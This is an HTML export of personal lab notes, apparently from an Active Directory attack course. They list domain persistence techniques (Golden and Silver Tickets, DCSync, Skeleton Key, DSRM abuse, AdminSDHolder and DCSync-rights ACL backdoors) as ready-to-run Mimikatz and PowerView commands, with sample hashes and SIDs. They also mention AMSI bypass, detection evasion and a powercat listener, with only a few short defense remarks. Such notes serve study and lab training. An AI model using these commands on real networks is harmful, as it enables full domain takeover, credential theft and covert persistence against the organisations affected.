<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>01-alltechniques</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>01-alltechniques</h1><br/><p><h2>Context :</h2><ul><li>we have domain admin privs </li></ul></p><p></p><p></p><p><h2>Golden Ticket</h2></p><p></p><p><ul><li>a golden ticket is a ticket signed and encrypted with the hash of krbtgt account which makes it a valid TGT ticket </li><li>if we get krbtgt hash =&gt; forge TD+GT of any user =&gt; impersonate TGT of any user <ul><li>1 password change doesn&#39;t affect it since windows will try the previous password </li></ul></li><li>Mimikatz :<ul><li>Invoke-Mimikatz -Command ‘&quot;lsadump::lsa /patch&quot;’ -ComputerName dcorp-dc // execute mimikatz on DC as DA to get krbtgt hash</li><li></li></ul></li></ul><img src="images/383-1.png" alt="images/383-1.png" /><ul><li>Invoke-Mimikatz -Command &#39;&quot;kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt&quot;&#39;<ul><li>klist </li></ul></li><li>check with <ul><li>ls \\dcorp-dc.dollarcorp.moneycorp.local\c$\users</li></ul></li></ul></p><p>    ◇ Note : before that we need to bypass AMSI (anti malware script) as we are loading a script in memory <ul><li>/ptt : inject the ticket in powershell</li><li>/ticket save the ticket for later usage </li><li>Other options to avoid detection :<ul><li></li></ul></li></ul><img src="images/383-2.png" alt="images/383-2.png" /></p><p><ul><li>Defense <ul><li>roll krbtgt password twice frequently</li><li>keep differnce between time resets to not invalidate all TGTs </li></ul></li></ul></p><p></p><p><h2>DCsync attack</h2><a name="h2-3"></a></p><p><ul><li>goal : extract krbtgt hash <ul><li>Invoke-Mimikatz -Command &#39;&quot;lsadump::dcsync /user:dcorp\krbtgt &quot;&#39;</li></ul></li></ul></p><p></p><p></p><p><h2>Silver Ticket attack </h2><ul><li>abuse step 5</li><li>requirement : hash of the service account</li><li>forge a valid TGS as any user to access that service</li><li>defense : PAC enabled (Privilege attribute certificate)</li><li>Steps :<ul><li>Invoke-Mimikatz -Command ‘&quot;lsadump::lsa /patch&quot;’ -ComputerName dcorp-dc // get the NTLM hash of svc account </li><li></li></ul></li></ul><img src="images/383-3.png" alt="images/383-3.png" /><ul><li>Invoke-Mimikatz -Command &#39;&quot;kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:RPCSS /rc4:731a06658bc10b59d71f5176e93e5710 /user:Administrator /ptt&quot;&#39;</li><li>example of services <ul><li>cifs : read dc system</li><li>HOST : schedule tasks on dc </li><li>Note : listener on woindows :<ul><li>. .\powercat.ps1</li><li>powercat -l -v -p 443 -t 1000 // waiting time of 1000 seconds </li></ul></li></ul></li></ul></p><p></p><p></p><p><h2>Skeleton key</h2><ul><li>idea : patch DC so that it allows access as any user with a single passwd (key)</li><li>not persistent across reboot (lssas process killed)<ul><li>not very often in real life</li></ul></li><li>Mimikatz command :<ul><li>Invoke-Mimikatz -Command &#39;&quot;privilege::debug&quot; &quot;misc::skeleton&quot;&#39;</li><li>password = mimikatz </li><li>Enter-PSSession -ComputerName &lt;dc&gt; -Credential dcorp\administrator</li></ul></li></ul></p><p></p><p></p><p></p><p><h2>DSRM</h2></p><p><ul><li>DSRM = directory service restore mode <ul><li>the safe mode for the DC</li><li>DSRM password is required when a server is promoted to DC and is never changed </li><li>by default DSRM administrator is not allowed to logon to the network =&gt; we could patch DC to bypass this</li></ul></li></ul></p><p> <ul><li> Attack steps <ul><li>Invoke-Mimikatz -Command ‘&quot;token::elevate&quot;&#39; &quot;lsadump::sam”&#39; -ComputerName dcorp-dc</li><li>Set-ItemProperty &quot;HKLM: \System\CurrentControlSet\Control\Lsa\” -Name &quot;DsrmAdminLogonBehaviour” -Value 2 <ul><li>Run on dc </li></ul></li><li>later we can connect to dc remotely using dsrm password </li></ul></li></ul></p><p></p><p></p><p><h2>Persistence using ACLS - AdminSDholder</h2><ul><li>AdminSDholder resides in the system container of a domain </li><li>AdminSDholder acl is propagated across all protected groups every 60 mins <ul><li>protected groups :</li><li></li></ul></li></ul><img src="images/383-4.png" alt="images/383-4.png" /><ul><li>these groups can be abused as they are powerfull</li></ul></p><p> <ul><li> if for example we add full control in ACL domain admin group , after &gt;60 min , this will be gone</li><li>Powerview remote exploit :<ul><li>Add-ObjectAcl -TargetADSprefix ‘CN= AdminSDHolder,CN = System’  -PrincipalSamAccountName</li></ul></li></ul></p><p>student1 -Rights All -Verbose <ul><li>Get-ObjectAcl -SamAccountName &quot;Domain Admins&quot; -ResolveGUIDs |{$_.IdentityReference match -&#39;student1&#39;} // check</li><li>Invoke-SDPropgator.ps1 to make the operation go instantly</li><li>we can abuse minor permissions like resset_password permission on Domain Admins group</li></ul></p><p> </p><p> </p><p> </p><p><h2>Persistence using ACLS:domain object: Dcsync rights </h2></p><p><ul><li>we can grant full control of our user<ul><li>Or add rights for DCSYNC</li><li>Add-ObjectAcl -TargetDistinguishedName ‘DC= dollarcorp,DC moneycorp,DC =local’</li></ul></li></ul></p><p>-PrincipalSamAccountName student1 -Rights DCSync -Verbose</p><p><ul><li>exploit DCSYNC :<ul><li>Invoke-Mimikatz -Command ‘&quot;lsadump::dcsync&quot; /user:garrison\krbtgt&quot;&#39; </li></ul></li></ul></p><p>  </p><p><h2>Persistence using security descriptor</h2></p><p><ul><li>from dc admin shell<ul><li> Set-RemotePSRemoting –SamAccountName student317 -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose</li></ul></li><li>Now we can access dc with powershell remoting without administrative access    </li><li>Invoke-Mimikatz -Command &#39;&quot;token::elevate&quot;&quot;vault::cred /patch&quot;&#39;</p><p></li></ul></p></div>
</body>
</html>
